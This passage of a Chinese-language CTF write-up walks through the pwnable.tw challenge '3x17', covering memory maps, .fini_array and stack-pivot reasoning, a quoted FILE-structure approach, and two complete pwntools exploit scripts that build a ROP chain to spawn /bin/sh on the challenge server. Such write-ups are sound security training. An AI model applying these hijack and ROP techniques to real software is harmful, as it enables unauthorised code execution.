+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r--p     1000 0      &#x2F;home&#x2F;regedit&#x2F;pwnable&#x2F;3x17</span><br><span class="line">          0x401000           0x48f000 r-xp    8e000 1000   &#x2F;home&#x2F;regedit&#x2F;pwnable&#x2F;3x17</span><br><span class="line">          0x48f000           0x4b3000 r--p    24000 8f000  &#x2F;home&#x2F;regedit&#x2F;pwnable&#x2F;3x17</span><br><span class="line">          0x4b4000           0x4ba000 rw-p     6000 b3000  &#x2F;home&#x2F;regedit&#x2F;pwnable&#x2F;3x17</span><br><span class="line">          0x4ba000           0x4bb000 rw-p     1000 0      </span><br><span class="line">         0x1841000          0x1864000 rw-p    23000 0      [heap]</span><br><span class="line">    0x7fff7995a000     0x7fff7997c000 rw-p    22000 0      [stack]</span><br><span class="line">    0x7fff799d5000     0x7fff799d8000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7fff799d8000     0x7fff799da000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
+<p>可写的地方没有执行权限，所以也只是任意地址写，无法再次将程序流劫持到别的地方(不知道栈地址，没办法改rsp/rbp/返回地址)<br>不过实际上可以考虑先迁移栈段再劫持___stack_chk_fail，但是不能用方案一二的方法迁移(因为还会导向方案二的错误)：<br><strong>首先canary为了防止leak，低字节总为\x00<br>可以利用这个特点</strong><br>注意到:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401B75                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000401B7E                 mov     [rbp+var_8], rax</span><br></pre></td></tr></table></figure>
+<p>所以可以首先劫持程序流到0x401b75(利用.fini_array):<br>覆盖：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4b40f0-&gt;0x4B9338</span><br><span class="line">0x4b40f8-&gt;0x401b75</span><br></pre></td></tr></table></figure>
+<p>此时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">leave-&gt;</span><br><span class="line">rbp&#x3D;0x4b9338</span><br><span class="line">rsp&#x3D;0x4b40f8</span><br><span class="line">ret-&gt;</span><br><span class="line">rip&#x3D;*rsp&#x3D;0x401b75</span><br></pre></td></tr></table></figure>
+<p>而后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401B75                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000401B7E                 mov     [rbp+var_8], rax</span><br><span class="line">-&gt;*rbp-0x8&#x3D;*0x4b9330&#x3D;canary</span><br><span class="line">&amp;(byte *)read_flag&#x3D;0x4b9330</span><br><span class="line">read_flag即为\x00</span><br></pre></td></tr></table></figure>
+<p><strong>此时迁移了栈段，然后此时read_flag=0，即可获得一次写机会(写got表)，注意此时read_flag++,canary就会改变，从而造成<strong><em>stack_chk_fail,成功劫持程序流并控制了栈段，但是方案依旧不可行，因为栈向低处增长，所以当第二次写的时候因为</em></strong>stack_chk_fail过程中栈顶(rsp)不断减小的关系，会到达0x4b4000处，此时会有一个push操作，而addr&lt;0x4b4000不具有可写权限，会导致程序崩溃</strong><br><strong>不过可以考虑先用___stack_chk_fail布置栈空间，再利用方案一迁移栈段即可</strong></p>
+<h3 id="方案四"><a href="#方案四" class="headerlink" title="方案四"></a>方案四</h3><p>这是后来我看到pernicious师傅的方案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set dtors to [do_dtors, main] so control flow is: do_dtors -&gt; call [1] main, call [0] do_dtors -&gt; ... and now we have infinitely many writes</span><br><span class="line">corrupt _IO_list_all by overwriting stderr and creating a chain of two fake file structs:</span><br><span class="line">  - first has write_base&#x2F;write_end set up such that on flushing, it will write out a stack pointer from the data section (this means the vtable entries are legit functions)</span><br><span class="line">  - second simply calls main</span><br><span class="line">set dtors to [do_dtors, _IO_flush_all_lockp] so control flow is: do_dtors -&gt; &#123; call [1] _IO_flush_all_lockp -&gt; main &#125;, call [2] do_dtors -&gt; ... so we still have infinitely many writes (and get the stack leak on the first iteration)</span><br><span class="line">reset dtors to [do_dtors, main]</span><br><span class="line">realize the address to write to is a sign-extended 4 byte int........ so can&#39;t just write to the stack.....</span><br><span class="line">overwrite stderr again, with write_base&#x2F;write_end pointing to the stack, and have it call _IO_file_read instead of _IO_file_write so it reads onto the stack rather than writing</span><br><span class="line">set dtors to [_IO_flush_all_lockp] which triggers the read onto the stack, send a ropchain</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终EXP为方案一&amp;&amp;方案三：</strong></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><strong>方案一：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="comment">#p=process("3x17")</span></span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_fini_array</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x402960</span>)+p64(<span class="number">0x401b6d</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop_chain</span></span><br><span class="line">pop_rdi=<span class="number">0x401696</span></span><br><span class="line">pop_rax=<span class="number">0x41e4af</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x44a309</span></span><br><span class="line">bin_sh_addr=<span class="number">0x4b4140</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4100</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdi))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4108</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(bin_sh_addr)+p64(pop_rax)+p64(<span class="number">0x3b</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4120</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4138</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x446e2c</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x401c4b</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>方案三：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("3x17")</span></span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10105</span>)</span><br><span class="line"><span class="comment">#_fini_array</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x402960</span>)+p64(<span class="number">0x401ba3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite .plt</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b70c0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x401ba3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop_chain</span></span><br><span class="line">pop_rdi=<span class="number">0x401696</span></span><br><span class="line">pop_rax=<span class="number">0x41e4af</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x44a309</span></span><br><span class="line">bin_sh_addr=<span class="number">0x4b4140</span></span><br><span class="line">pop_rsp_ret=<span class="number">0x0402ba9</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x4b40f8</span>)+p64(<span class="number">0x401c4b</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4100</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdi))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4108</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(bin_sh_addr)+p64(pop_rax)+p64(<span class="number">0x3b</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4120</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4138</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x446e2c</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b70c0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"data:"</span>,p64(<span class="number">0x402960</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze："><span class="toc-number">1.</span> <span class="toc-text">Analyze：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方案一"><span class="toc-number">1.1.</span> <span class="toc-text">方案一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方案二"><span class="toc-number">1.2.</span> <span class="toc-text">方案二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方案三"><span class="toc-number">1.3.</span> <span class="toc-text">方案三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方案四"><span class="toc-number">1.4.</span> <span class="toc-text">方案四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP:</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/08/pwnable-tw-3x17/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&text=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&is_video=false&description=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw_3x17&body=Check out this article: http://yoursite.com/2019/02/08/pwnable-tw-3x17/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&title=pwnable.tw_3x17" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/08/pwnable-tw-3x17/&name=pwnable.tw_3x17&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
